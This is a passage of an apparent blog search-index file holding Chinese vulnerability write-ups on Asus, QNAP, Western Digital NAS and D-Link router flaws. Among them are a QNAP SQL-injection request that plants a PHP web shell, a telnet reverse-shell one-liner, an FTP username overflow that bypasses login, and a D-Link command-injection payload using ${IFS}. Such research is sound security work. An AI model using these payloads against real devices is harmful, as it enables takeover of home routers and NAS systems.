s1.recv(1024).decode()\rprint(text) 这里是使用的socket发送的包。\n让我们看看这个包发过去之后程序是怎么处理的：\n可以看到这里已经把A给解码出来了，现在开始解码%a\n这里开始解码%a，随后到strlcpy：\n这里将s放入s_tmp，这时的字符串已经变为了A\\na：\n随后达到strncpy：\n可以看到参数，第二个参数是s_tmp，可以看到s_tmp已经越界读取了。\n漏洞不能利用的原因 现在我们理解了漏洞是怎么样产生的，那么理论上只要我们构造如下的数据包，就可以造成溢出：\n/Main_Login.asp?ht=%41%41......%41%a\\x00BBBBB 这样经过这个循环后，理论上数据包就会变为：\n/Main_Login.asp?ht=AA....A\\nBBBBB 可是为什么是理论上呢，这是因为如果我们发送/Main_Login.asp?ht=%41%41......%41%a\\x00BBBBB的话，会因为\\x00截断，根本不能发送我们构造的特殊数据包。所以这个漏洞无法利用，上面的利用也只存在于理论中。\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2022-26376-%E5%8D%8E%E7%A1%95%E5%9B%BA%E4%BB%B6%E5%86%85%E5%AD%98%E5%B4%A9%E6%BA%83%E6%BC%8F%E6%B4%9E%E6%9C%AA%E5%88%A9%E7%94%A8/","summary":"CVE-2022-26376 华硕固件内存崩溃漏洞 漏洞简介 该漏洞存在于华硕固件和梅林固件中，不同型号对应的固件版本也不一致。如果想了解具体的型号，可以在NVD - CVE-2022-26376找到。\n根据塔洛斯的说法：\nA memory corruption vulnerability exists in the httpd unescape functionality of Asuswrt prior to 3.0.0.4.386_48706 and Asuswrt-Merlin New Gen prior to 386.7.. A specially-crafted HTTP request can lead to memory corruption. An attacker can send a network request to trigger this vulnerability.\n这个漏洞会导致内存损坏。通过研究确实可以造成溢出，但并不能控制程序流。简言之就是，这个漏洞会造成内存损坏，但难以被利用。\n漏洞分析 这里我使用的是梅林的386.5.2的源码\n这里就是漏洞点，程序的大致流程为，判断字符串s中有没有百分号，如果有就利用sscanf函数对百分号和百分号后的两位进行解码，并将解码后的字符放在原百分号的位置，随后使用strlcpy和strncpy来覆盖百分号后两个字符。例如字符%41%42：\n字符串中有百分号，使用sscanf函数对%41解码，并将解码出来的A放到原百分号的位置，字符变味了：A41%42 随后利用strlcpy将跳过**41将%42**放入s_tmp 最后，使用strncpy将%42接在A后面，原字符串就变为了：A%42 这就是一个解码url的循环。\n乍一看，确实没问题，但是问题是如果我们将%41%42改了%41%a的话，就会出现问题：\n第一轮解码，将会正常解析，字符串会变为：A%a\n但当解析%a时就会出问题：\n同样检测到百分号之后，使用sscanf函数对*%a进行解析，会解析为\\n*，随后放到百分号的位置，字符串变为：A\\na。 这时，strlcpy函数任然会读取原百分号（现在为\\n）后两个字节放到s_tmp中。 这里我们可以看到，字符串中\\n后只有一个字节（a）了。而strlcpy函数会读取\\n后两个字节，这就说明会发生读取越界。\n这里我们可以在设备上调试一下：\n#!/usr/bin/python3\rimport socket\rurl = b\u0026#34;GET /Main_Login.","title":"CVE-2022-26376 华硕固件内存崩溃漏洞"},{"content":"CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。\n固件版本为：\n该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。\n环境搭建 这里是直接使用的设备(qnap TS-853 pro)\n该设备可以直接通过ssh和telnet连接上shell：\n连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell\n漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。\n针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：\n[CVE-2022-27596 | CataLpa\u0026rsquo;s Home (wzt.ac.cn)]\n该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。\n静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中\n该函数删除了符号，但可以通过搜索字符串找到。\nv9 = s\r···\rif ( *(_QWORD *)(a8 + 24) )\r{\rv13 = *(const char **)(a8 + 24);\rv14 = strlen(s);\ra2 = \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;;\rsprintf(\u0026amp;s[v14], \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;, v13);\r}\r···\rv49 = sqlite3_mprintf(\u0026amp;byte_7FFFF76DFA7F, a2, v9);\r···\rv48 = sqlite3_mprintf(\u0026#34;SELECT * FROM QTOKEN %s %s %s;\u0026#34;, v49, v51, v50);\r···\rsqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到\u0026quot;AND token = '%s' \u0026quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制\n动态分析 我们知道了该漏洞在authLogin.cgi的库文件中libuLinux_NAS.so.0.0中。\n上面的文章采用的是写一个脚本进行循环附加，但无法保证断点的位置。我是一次都没有断在关键的地方\n所以我们选择直接调试authLogin.cgi，虽然可以直接调试cgi程序，但是如果想要程序进入漏洞点，还需要传给authLogin.cgi需要的数据，这种数据常见的是环境变量。\n首先，关掉地址随机化\n至于需要什么数据，这就得去ida里找了。\n这里我会将直接给出调试命令和TB，这样就可以通过ida来学习怎么找环境变量，但实际情况下如果要找到需要的数据还是要一点一点啃源码或者反汇编：\nQUERY_STRING=\u0026#34;app=MUSIC_STATION\u0026amp;app_token=123\u0026amp;sid=1\u0026amp;client_app=1\u0026amp;client_agent=\u0026lt;\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;\u0026gt;\u0026#34; ./gdbserver :1234 authLogin.cgi 在qnap上执行命令，使用gdb连上去，和常规的gdb远程调试一样，然后将断点打在漏洞处，随后c过去。\n然后往下，就可以看到程序拼接的sql语句：\n继续往下就是最终的sql语句：\n漏洞复现 因为我们可以进行sql注入，那么我们就可以使用sql语句创建一个php文件，写入一句话马：\nPOST /cgi-bin/authLogin.cgi HTTP/1.1\rHost: 192.168.0.177:5000\rContent-Length: 158\rConnection: close\rapp=MUSIC_STATION\u0026amp;app_token=123\u0026#39;;ATTACH DATABASE \u0026#39;/share/CACHEDEV1_DATA/.qpkg/musicstation/123.php\u0026#39; AS qnapkey;CREATE TABLE qnapkey.key (dataz text);INSERT INTO qnapkey.key (dataz) VALUES (\u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;);--\r\u0026amp;sid=1\u0026amp;client_app=1\u0026amp;client_agent=\u0026lt;\u0026#34;a\u0026#34; * 0x3000\u0026gt; 这里需要熟悉sql语句，并且qnap使用的是sqlite数据库。可惜我并不熟悉sql语句，故只能使用上面提到的这位大佬的poc 。我太菜了\n发送这个包后，我们就可以在设备里搜索到这个php文件了\n随后我们访问这个php：\n可以看到命令已经执行了。\n注意事项 需要注意的是，在qnap的本身的服务中，绝大数都是使用的cgi来实现的，因此将一句话木马放在网站的文件系统下，是不能被php解析的。\n这时，我们就需要将一句话木马放入app的目录中，例如MUSIC_STATION、PHOTO_STATION的目录下，而存放app的目录则是/share/CACHEDEV1_DATA/.qpkg/：\n放到这些文件夹下后，找到对应的路径访问就行了：\n随后使用exp，打开nc，使用以下命令反弹shell：\nrm /tmp/f;mknod /tmp/f p;telnet 192.168.50.30 8080 \u0026lt; /tmp/f |/bin/bash \u0026gt;/tmp/f 2\u0026gt;/tmp/f Don\u0026rsquo;t ask me where is the exp\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2022-27596-%E5%A8%81%E8%81%94%E9%80%9A5.0.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-27596 威联通5.0.1sql注入漏洞 漏洞简介 该漏洞是威联通(qnap)旗下的NAS设备的固件上的数据库注入漏洞。\n固件版本为：\n该漏洞出现在QTS和QTS_hero的5.0.1版本的固件上且只出现在这一个版本的固件上，应该是一个新添加的功能发现了漏洞，然后被修复了。\n环境搭建 这里是直接使用的设备(qnap TS-853 pro)\n该设备可以直接通过ssh和telnet连接上shell：\n连上shell后会出现选择菜单，但退出菜单后，就可以选择是否进入linux的shell\n漏洞分析 对于qnap的漏洞，在网上基本除了CVE号，很少有其他的信息。其原因大家懂的都懂。\n针对这种漏洞，我们需要通过比较补丁的方式来定位漏洞点，至于如何定位到该漏洞请看这篇文章：\n[CVE-2022-27596 | CataLpa\u0026rsquo;s Home (wzt.ac.cn)]\n该文章虽然写了怎么调试漏洞，但是我在调试时，每次程序都不能断在关键的位置，故下面采用其他的方法进行调试。\n静态分析 该漏洞存在authLogin.cgi的库文件中libuLinux_NAS.so.0.0的sub_7FFFF76BB4CB函数中\n该函数删除了符号，但可以通过搜索字符串找到。\nv9 = s\r···\rif ( *(_QWORD *)(a8 + 24) )\r{\rv13 = *(const char **)(a8 + 24);\rv14 = strlen(s);\ra2 = \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;;\rsprintf(\u0026amp;s[v14], \u0026#34;AND token = \u0026#39;%s\u0026#39; \u0026#34;, v13);\r}\r···\rv49 = sqlite3_mprintf(\u0026amp;byte_7FFFF76DFA7F, a2, v9);\r···\rv48 = sqlite3_mprintf(\u0026#34;SELECT * FROM QTOKEN %s %s %s;\u0026#34;, v49, v51, v50);\r···\rsqlite3_free(v48) 漏洞点则在sprintf()函数，该函数使用的%s，会直接将v13参数上的字符拼接到\u0026quot;AND token = '%s' \u0026quot;上，最后拼接到sql语句上。但是v13是可以被我们控制的，也就意味着sql语句可以被我们控制","title":"CVE-2022-27596 威联通5.0.1sql注入漏洞"},{"content":"CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。\n环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。\n因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。\n当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录\n执行下面的命令将pure-ftpd修改为西数的版本：\ntar xf pure-ftpd_1.0.47.orig.tar.gz\rcd pure-ftpd-1.0.47.orig\rfor patch_name in `ls ../patch`; do echo \u0026#34;--\u0026gt;patch name=$patch_name\u0026#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。\n解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。\n根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。\n但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：\n这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。\nbin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。\n刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：\n这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录\n而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：\n可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。\n将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init\n**注意：**这里的路径是已经被挂载后的路径。\n这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。\n启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。\n虽然环境不能启动，但是我们可以直接启动ftp服务呀。\n我们可以直接启动ftp服务：\n漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。\n而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：\n这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。\n那么为什么要覆盖着loggedin呢？\n其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：\n动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：\n但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。\n故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent\n其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。\n接下来我们实际操作一下。\n首先用gdbserver挂起程序：\n别问为啥本地也要用gdbserver，问就是gdbserver用习惯了，脑子没转过来\n随后用gdb连接上：\ngdb连上后会断在*_start函数，这里我们直接把断点打在accept_client函数和douser*函数上\n然后c，看到程序会卡住，这里程序是进入了select函数，需要我们进行连接：\n$ python3\r\u0026gt;\u0026gt;\u0026gt; from ftplib import FTP\r\u0026gt;\u0026gt;\u0026gt; ftp = FTP(\u0026#39;0.0.0.0\u0026#39;) 随后函数就会在断点1处停下来，这时我们设定follow-fork-mode为parent\n然后继续c，这时候程序又会被阻塞，需要我们在ftp中输入命令：\n\u0026gt;\u0026gt;\u0026gt; ftp.login(\u0026#39;a\u0026#39;*2146) 我们就可以成功进入douser函数了：\n随后我们来到漏洞点的strncpy函数：\n这时我们先看看loggedin变量的值：\n可以看到现在为0，然后我们步过strncpy函数：\n这时loggedin的值已经被覆盖了。\n漏洞复现 刚刚我们对漏洞进行了分析，现在我们总体来看一遍漏洞的效果：\n首先直接启动pure-ftpd，然后利用python进行访问：\n$ python3\r\u0026gt;\u0026gt;\u0026gt; from ftplib import FTP\r\u0026gt;\u0026gt;\u0026gt; ftp = FTP(\u0026#39;0.0.0.0\u0026#39;) 接下来我们需要执行一个在没有授权时，不能执行的操作：\n\u0026gt;\u0026gt;\u0026gt; ftp.pwd() 看到回复，说明没有登录。接下来对权限进行绕过：\n这里已经提示，我们已经登录过了。\n然后再次执行需要授权的操作：\n\u0026gt;\u0026gt;\u0026gt; ftp.pwd() 这时不再提示需要登录而是直接返回工作路径了。\nrce rce需要设备环境，但现在没有设备，大概思路为更改工作路径，上传马，但是设备的环境和自己的环境是有差距的，所以想要rce就需要买设备。没钱\n","permalink":"https://jellyfish-pro.github.io/posts/cve-2022-29844-%E8%A5%BF%E6%95%B0nas-my_cloud_pro_series_pr4100-ftp%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞 漏洞简介 该漏洞是存在于西数nas上的一个ftp权限绕过漏洞。其广泛存在于西数的多款nas设备中。但在设备中，ftp服务并不是默认开启的。故该漏洞的利用存在一定的限制。\n环境搭建 该漏洞是Luca Moro (@johncool__) 在Pwn2Own比赛中曝光的。故我们可以直接拿比赛中使用的固件。\n因为漏洞存在于ftp服务中，而西数nas设备的ftp服务来自于开源项目：Pure-FTPd。\n当然西数在其基础上进行了，首先下载西数所有的GPL，解压后进入WDMyCloud_PR4100_GPL_v5.24.108_20220826/open-source-packages/pure-ftpd/pure-ftpd-1.0.47/目录\n执行下面的命令将pure-ftpd修改为西数的版本：\ntar xf pure-ftpd_1.0.47.orig.tar.gz\rcd pure-ftpd-1.0.47.orig\rfor patch_name in `ls ../patch`; do echo \u0026#34;--\u0026gt;patch name=$patch_name\u0026#34; ; patch -p1 -i ../patch/${patch_name} ; done 设备启动流程 接下来我们将固件进行解压，该固件直接用binwalk解压就行。\n解压下来后我们可以观察到，固件中有一个cpio-root和squashfs-root文件夹。\n根据以往的经验，cpio-root文件夹是BootLoader启动内核阶段的临时文件系统。而squashfs-root是设备真正的文件系统。\n但在西数nas设备中却不太一样，进入squashfs-root文件夹中，我们可以发现这里面的bin文件夹下没有文件：\n这就意味着直接使用这个文件夹作为根目录的话，是不能执行命令的。并且在etc文件夹下没有和系统启动相关的文件。\nbin文件夹下没有东西，那么整个系统是怎么运行的呢？我们就要来到系统运行的上一步：BootLoader加载内核。\n刚刚说到，cpio-root文件夹中有一个文件系统，来到这个文件夹下的etc目录，我们就可以看到：\n这里就出现了一个inittab的系统初始化文件，在这个文件中就指明了系统启动需要去找的文件：/etc/rc.sh 注意这里不是指本机的etc目录\n而在/etc/rc.sh 中有一段代码，会将squashfs文件夹挂载到当前文件系统的*/usr/local/modules*目录下：\n可以看到这段代码已经被注释掉，原因是开发者将这段代码集成到了上面的chk_image二进制文件中。\n将squashfs文件夹挂载过来后，/etc/rc.sh 会在最后运行一个脚本：system_init\n**注意：**这里的路径是已经被挂载后的路径。\n这个system_init的主要内容就是将squashfs文件夹中的文件复制到当前文件系统对应的文件中，并且启动各种服务。\n启动ftp服务 上面将系统启动的流程理清了，理清了之后我们就可以尝试启动环境。但是可惜的是，虽然该设备的架构是x86-64，但是任然不能启动，原因可能是设备自检没有过。\n虽然环境不能启动，但是我们可以直接启动ftp服务呀。\n我们可以直接启动ftp服务：\n漏洞分析 静态分析 因为这是一个权限绕过漏洞，而该ftp文件中就有两个专门处理登录的函数：douser和dopass，而漏洞点则出现在douser函数中： 通过源码，我们可以看到这里并没有对username的长度进行限制，username是函数的参数，这个参数是用户可以控制的。\n而auth_name本身的长度只有2048个字节，如果我们输入超过2048个字节就会造成溢出。那么，我们要溢出多少字节呢？通过ida可以更加直观的看到：\n这里可以看到，下面有一个loggedin。我们需要覆盖到这个变量，覆盖一个字节就可以了。那么就需要溢出98个字节。一共要给auth_name输入2048+98个字节。\n那么为什么要覆盖着loggedin呢？\n其实从名称就可以猜到，这个变量的作用是标记用户已经登录。而实际上也确实是这个作用：\n动态分析 这里我们采用gdb进行调试，但再调试之前，我们需要先明确程序到漏洞点的流程，其BT如下：\n但需要注意的是：该程序到漏洞点，会经历两次fork函数，第一次fork函数我们需要跟随子进程，而第二次fork函数我们需要跟随父进程。\n故我们需要在gdb中选择适当的时机将follow-fork-mode设置为parent\n其实我们找到两个fork函数，并在他们中间设置就好了，但是这里我为了方便，直接将断点打在了accept_client函数里的call doit处，设置好follow-fork-mode后再在douser函数处打断点，运行到漏洞点。","title":"CVE-2022-29844 西数nas My_Cloud_Pro_Series_PR4100 ftp权限绕过漏洞"},{"content":"CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。\n那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。\nqemu-system 启动成功 因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。\n首先我们需要为qemu-system搭建一个网桥：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 查看ifconfig可以看到已经配置成功：\n然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（下载（×），找师兄白嫖（√））：\n接下来使用命令开启qemu-system:\nsudo qemu-system-mipsel -M malta -m 512 \\\r-kernel vmlinux-3.2.0-4-4kc-malta-x86 \\\r-hda debian_wheezy_mipsel_standard.qcow2 \\\r-append \u0026#34;root=/dev/sda1 console=ttyS0\u0026#34; \\\r-net nic,macaddr=00:19:3e:00:00:01 -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no -kernel：选择内核版本，这里选择lighttpd符合的版本\n-hda：选择硬盘文件\n-nographic：不适用GUI图形界面\n-net nic -net tap,ifname=tap0,script=no,downscript=no：选择桥接模式，使用刚刚我们创建的网卡\n启动成功后，给qemu-system分配ip：\nifconfig eth0 \u0026lt;your-ip\u0026gt; 然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）\n随后解压，挂载debian系统的/proc和/dev：\nmount --bind /proc ./proc\rmount --bind /dev ./dev\rchroot . /bin/bash 最后启动服务：\n**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了\n./etc/init.d/php7-fastcgi start\r./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf 漏洞复现 **注：**该漏洞需要登陆获取cookie\n首先我们来到路由器登陆界面开启抓包：\n输入密码后看到抓包：\n这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie\n将这个cookie复制到poc上，就可以执行命令了：\n{\u0026#34;SetIpMacBindSettings\u0026#34;:{\u0026#34;lan_unit\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;lan(0)_dhcps_staticlist\u0026#34;:\u0026#34;1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9\u0026#34;}} 这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。符合黑客低调的行事风格（雾）\n复现结果如下\n漏洞点代码分析 根据git上的poc我们可以看到，该漏洞是存在于 /www/HNAP1/control/SetIpMacBindSettings.php文件中\n对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.\n大概的流程为：\n#SetIpMacBindSettings.php:35\r$staticlist = explode(\u0026#34;;\u0026#34;, $option[\u0026#39;lan(0)_dhcps_staticlist\u0026#39;]); 这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：\n随后，进入循环，将值赋给 $val：\n#SetIpMacBindSettings.php:74\rforeach ($staticlist as $val) 接下来，代码会将我们输入的值根据 “,”分割：\n#SetIpMacBindSettings.php:75\r$vl_arr = explode(\u0026#34;,\u0026#34;, $val); 所以我们的命令存放在 $val[1]中，\n最后跟随着另外的命令一起执行：\n#SetIpMacBindSettings.php:80\rexec(\u0026#34;changename.sh \u0026#34; . $vl_arr[2] . \u0026#34; \u0026#34; . $vl_arr[1]); 当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。\n例如如下代码：\n#SetIpMacBindSettings.php:54\r$special_char_arr = array(\u0026#34;\\\u0026#39;\u0026#34;, \u0026#34; \u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;);\rif (contains_special_char($vl_arr[1], $special_char_arr)) {\r$result[\u0026#34;message\u0026#34;] = \u0026#34;specil character.\u0026#34;;\r$this-\u0026gt;api_response(__CLASS__, $result);\r}\r#HNAP1/core/fun/public.php:420\rfunction contains_special_char($str, $special_char_arr)\r{\rfor ($i = 0; $i \u0026lt; count($special_char_arr); $i++) {\rif (strpos($str, $special_char_arr[$i]) !== false) {\rreturn true;\r}\r}\rreturn false;\r} 可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 contains_special_char函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。\n但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 ${IFS} \\t等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。\nexp编写 通过上面的漏洞复现，我们可以知道exp需要经历的流程：\n第一次登陆——》第二次登陆——》获取cookie——》发送命令 那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？\n通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：\n这是第一次登陆发送的包头，而返回的包头中多出来了一个Set-Cookie的字段：\n然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：\n同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：\n这里可以看到uid是直接把返回包的cookie字段复制过去了，但是privatekey是怎么得到的呢？\n我们只能又去找源码了。\n因为我们是通过login.html点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：\n#/www/login.html:404\r\u0026lt;td\u0026gt;\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;\u0026#34; id=\u0026#34;logIn_btn\u0026#34; class=\u0026#34;styled_button_long\u0026#34; onClick=\u0026#34;OnClickLogin();\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; 通过这个onClinck事件，我们可以追朔到 \\www\\Login.html:243\n这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：\n#\\www\\Login.html:244\rvar Login_Password = document.getElementById(\u0026#34;admin_Password1\u0026#34;).value;\rvar Login_Captcha = \u0026#34;\u0026#34;;\rdocument.getElementById(\u0026#34;logIn_btn\u0026#34;).disabled = true;\rdocument.getElementById(\u0026#34;error_1\u0026#34;).style.display = \u0026#34;none\u0026#34;;\rdoLogin(Login_Password, Login_Captcha) 这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 doLogin()的函数。\n根据经验，我们可以猜测，这个函数里就是处理密码的地方 根据经验（×），这么大一个login就写在上面（√）\n通过寻找，我们追寻到了 \\www\\js\\Login.js\n在这里我们就可以看到上面privatekey的来历了：\n#\\www\\js\\Login.js:16\rPrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);\rPrivateKey = PrivateKey.toUpperCase();\t//将PrivateKey全改为大写 这个 ifLogin_Password 就是咱们传进来的密码\n现在我们知道这个privatekey是怎么来的了。\n但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：\n#\\www\\js\\Login.js:28\r$.cookie(\u0026#39;PrivateKey\u0026#39;, PrivateKey, {path: \u0026#39;/\u0026#39;});\rvar Login_Passwd = md5(PrivateKey + obj.Challenge);\rLogin_Passwd = Login_Passwd.toUpperCase(); 到这里，整个密码的加密过程就完整了：\n先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge） ","permalink":"https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","summary":"CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 